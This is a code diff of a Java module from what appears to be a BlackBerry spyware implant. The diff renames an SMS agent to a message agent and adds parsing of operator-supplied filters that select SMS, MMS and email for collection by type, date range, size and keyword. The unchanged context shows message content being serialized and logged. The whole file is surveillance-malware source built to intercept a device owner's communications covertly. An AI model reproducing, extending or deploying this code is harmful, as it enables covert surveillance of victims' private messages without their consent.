@@ -1,6 +1,7 @@
 package com.ht.rcs.blackberry.agent;
 
 import java.io.ByteArrayOutputStream;
+import java.io.EOFException;
 import java.io.IOException;
 import java.util.Date;
 import java.util.Vector;
@@ -32,6 +33,7 @@ import com.ht.rcs.blackberry.utils.DateTime;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 import com.ht.rcs.blackberry.utils.Utils;
+import com.ht.rcs.blackberry.utils.WChar;
 
 /*
  * http://rcs-dev/trac/browser/RCSASP/deps/Common/ASP_Common.h
@@ -56,7 +58,182 @@ import com.ht.rcs.blackberry.utils.Utils;
 
  */
 
-public class SmsAgent extends Agent {
+public class MessageAgent extends Agent {
+
+    private static final byte PREFIX_TYPE_IDENTIFICATION = 1;
+    private static final byte PREFIX_TYPE_FILTER = 2;
+    private static final int PREFIX_TYPE_HEADER = 64;
+    private static final int PREFIX_TYPE_KEYWORD = 1;
+
+    private static final int FILTER_TYPE_REALTIME = 0;
+    private static final int FILTER_TYPE_COLLECT = 1;
+
+    private static final int FILTER_CLASS_UNKNOWN = 0;
+    private static final int FILTER_CLASS_SMS = 1;
+    private static final int FILTER_CLASS_MMS = 2;
+    private static final int FILTER_CLASS_EMAIL = 3;
+
+    protected class Prefix {
+        public int length;
+        public byte type;
+
+        public int payloadStart;
+        //public byte[] payload;
+
+        private boolean valid;
+
+        public Prefix(final byte[] conf, final int offset) {
+            DataBuffer databuffer = new DataBuffer(conf, offset, conf.length
+                    - offset, false);
+            try {
+                byte bl0 = databuffer.readByte();
+                byte bl1 = databuffer.readByte();
+                byte bl2 = databuffer.readByte();
+                type = databuffer.readByte();
+
+                length = bl0 + (bl1 << 8) + (bl2 << 16);
+
+                //payload = new byte[length];
+                //databuffer.read(payload);
+
+                payloadStart = offset + 4;
+
+                //#debug
+                debug.trace("Token type: " + type + " len: " + length
+                        + " payload:"
+                        + Utils.byteArrayToHex(conf, payloadStart, length));
+                valid = true;
+            } catch (EOFException e) {
+                //#debug
+                debug.error("cannot parse Token: " + e);
+                valid = false;
+            }
+        }
+
+        public boolean isValid() {
+            return valid;
+        }
+    }
+
+    protected class Filter {
+        private static final int PREFIX_LEN = 4;
+
+        public long size;
+
+        public long version;
+        public long type;
+        public byte[] classname;
+        public int classtype;
+
+        public boolean enabled;
+        public boolean all;
+        public boolean doFilterFromDate;
+        public long fromDate;
+        public boolean doFilterToDate;
+        public long toDate;
+        public long maxMessageSize;
+        public long maxMessageSizeToLog;
+
+        public Vector keywords = new Vector();
+
+        boolean valid;
+
+        public int payloadStart;
+
+        public Filter(final byte[] conf, final int offset, final int length) {
+            int headerSize = 116;
+            int classNameLen = 32;
+            int confSize = conf.length - offset;
+
+            Check.requires(confSize >= headerSize, "conf smaller than needed");
+
+            Prefix headerPrefix = new Prefix(conf, offset);
+
+            if (!headerPrefix.isValid()) {
+                return;
+            }
+
+            DataBuffer databuffer = new DataBuffer(conf,
+                    headerPrefix.payloadStart, headerPrefix.length, false);
+
+            //#ifdef DBC
+            Check.asserts(headerPrefix.type == PREFIX_TYPE_HEADER,
+                    "Wrong prefix type");
+            Check.asserts(headerSize == headerPrefix.length,
+                    "Wrong prefix length");
+            //#endif
+
+            // LETTURA del HEADER
+            try {
+
+                size = databuffer.readInt();
+                version = databuffer.readInt();
+                type = databuffer.readInt();
+                classname = new byte[classNameLen];
+                databuffer.read(classname);
+
+                String classString = WChar.getString(classname, false);
+                if (classString.equals("IPM.SMSText*")) {
+                    classtype = FILTER_CLASS_SMS;
+                } else if (classString.equals("IPM.Note*")) {
+                    classtype = FILTER_CLASS_EMAIL;
+                } else if (classString.equals("IPM.MMS*")) {
+                    classtype = FILTER_CLASS_MMS;
+                } else {
+                    classtype = FILTER_CLASS_UNKNOWN;
+                    //#debug
+                    debug.error("classtype unknown: " + classString);
+                }
+
+                //#debug
+                debug.trace("classname: " + classString);
+
+                enabled = databuffer.readBoolean();
+                all = databuffer.readBoolean();
+                doFilterFromDate = databuffer.readBoolean();
+                fromDate = databuffer.readLong();
+                doFilterToDate = databuffer.readBoolean();
+                toDate = databuffer.readLong();
+                maxMessageSize = databuffer.readLong();
+                maxMessageSizeToLog = databuffer.readLong();
+
+                payloadStart = (int) (headerPrefix.payloadStart + size);
+
+                valid = true;
+            } catch (EOFException e) {
+                valid = false;
+
+            }
+
+            // Lettura delle KEYWORDS
+            if (length > headerPrefix.length) {
+                // ogni keyword ha il suo prefix
+                int endOffset = offset + length;
+                int keywordOffset = offset + headerSize + PREFIX_LEN;
+
+                while (keywordOffset < endOffset) {
+                    Prefix keywordPrefix = new Prefix(conf, keywordOffset);
+
+                    //#ifdef DBC
+                    Check.asserts(keywordPrefix.type == PREFIX_TYPE_KEYWORD,
+                            "Wrong prefix type");
+                    //#endif
+
+                    String keyword = WChar.getString(conf, keywordOffset,
+                            keywordPrefix.length, false);
+                    keywordOffset += keywordPrefix.length + PREFIX_LEN;
+
+                    debug.trace("Keyword: " + keyword);
+                    keywords.addElement(keyword);
+                }
+            }
+        }
+
+        public boolean isValid() {
+            return valid;
+        }
+    }
+
     //#debug
     static Debug debug = new Debug("SmsAgent", DebugLevel.VERBOSE);
 
@@ -82,8 +259,8 @@ public class SmsAgent extends Agent {
 
     private static final int MAIL_VERSION = 2009070301;
 
-    public SmsAgent(boolean agentStatus) {
-        super(AGENT_SMS, agentStatus, true, "SmsAgent");
+    public MessageAgent(boolean agentStatus) {
+        super(AGENT_MESSAGE, agentStatus, true, "MessageAgent");
 
         // #ifdef DBC
         Check.asserts(Log.convertTypeLog(this.agentId) == LogType.MAIL_RAW,
@@ -91,7 +268,7 @@ public class SmsAgent extends Agent {
         // #endif
     }
 
-    protected SmsAgent(boolean agentStatus, byte[] confParams) {
+    protected MessageAgent(boolean agentStatus, byte[] confParams) {
         this(agentStatus);
         parse(confParams);
 
@@ -105,6 +282,100 @@ public class SmsAgent extends Agent {
 
     long timestamp;
     long firsttimestamp = 0;
+
+    protected String identification;
+    public Vector filtersSMS = new Vector();
+    public Vector filtersMMS = new Vector();
+    public Vector filtersEMAIL = new Vector();
+
+    protected boolean parse(final byte[] conf) {
+
+        Vector tokens = tokenize(conf);
+        if (tokens == null) {
+            //#debug
+            debug.error("Cannot tokenize conf");
+            return false;
+        }
+
+        int size = tokens.size();
+        for (int i = 0; i < size; ++i) {
+            Prefix token = (Prefix) tokens.elementAt(i);
+
+            switch (token.type) {
+            case PREFIX_TYPE_IDENTIFICATION:
+                // IDENTIFICATION TAG 
+                identification = WChar.getString(conf, token.payloadStart,
+                        token.length, false);
+                //#debug
+                debug.trace("Type 1: " + identification);
+                break;
+            case PREFIX_TYPE_FILTER:
+                // Filtro (sempre 2, uno COLLECT e uno REALTIME);
+                try {
+                    Filter filter = new Filter(conf, token.payloadStart,
+                            token.length);
+                    if (filter.isValid()) {
+                        switch (filter.classtype) {
+                        case FILTER_CLASS_EMAIL:
+                            //#debug
+                            debug.trace("Adding email filter: " + filter.type);
+                            filtersEMAIL.addElement(filter);
+                            break;
+                        case FILTER_CLASS_MMS:
+                            //#debug
+                            debug.trace("Adding mms filter: " + filter.type);
+                            filtersMMS.addElement(filter);
+                            break;
+                        case FILTER_CLASS_SMS:
+                            //#debug
+                            debug.trace("Adding sms filter: " + filter.type);
+                            filtersSMS.addElement(filter);
+                            break;
+                        case FILTER_CLASS_UNKNOWN: // fall through
+                        default:
+                            //#debug
+                            debug.error("unknown classtype: "
+                                    + filter.classtype);
+                            break;
+                        }
+                    }
+                    //#debug
+                    debug.trace("Type 2: header valid: " + filter.isValid());
+                } catch (Exception e) {
+                    //#debug
+                    debug.error("Cannot filter" + e);
+                }
+                break;
+
+            default:
+                debug.error("Unknown type: " + token.type);
+                break;
+            }
+
+            //tokens.removeElementAt(i);
+        }
+
+        return true;
+    }
+
+    private Vector tokenize(byte[] conf) {
+        Vector tokens = new Vector();
+        int offset = 0;
+        int length = conf.length;
+
+        while (offset < length) {
+            Prefix token = new Prefix(conf, offset);
+            if (!token.isValid()) {
+
+                return null;
+            } else {
+                tokens.addElement(token);
+                offset += token.length + 4;
+            }
+        }
+
+        return tokens;
+    }
 
     public void actualStart() {
 
@@ -179,11 +450,6 @@ public class SmsAgent extends Agent {
         markup_date.writeMarkup(serialize);
 
         // return true;
-    }
-
-    protected boolean parse(byte[] confParameters) {
-
-        return false;
     }
 
     /**
@@ -339,10 +605,10 @@ public class SmsAgent extends Agent {
         ByteArrayOutputStream os = null;
         try {
             os = new ByteArrayOutputStream();
-            message.writeTo(os);                      
+            message.writeTo(os);
             byte[] content = os.toByteArray();
-            
-            String messageContent= new String(content);
+
+            String messageContent = new String(content);
             debug.trace(messageContent);
 
             int flags = 1;
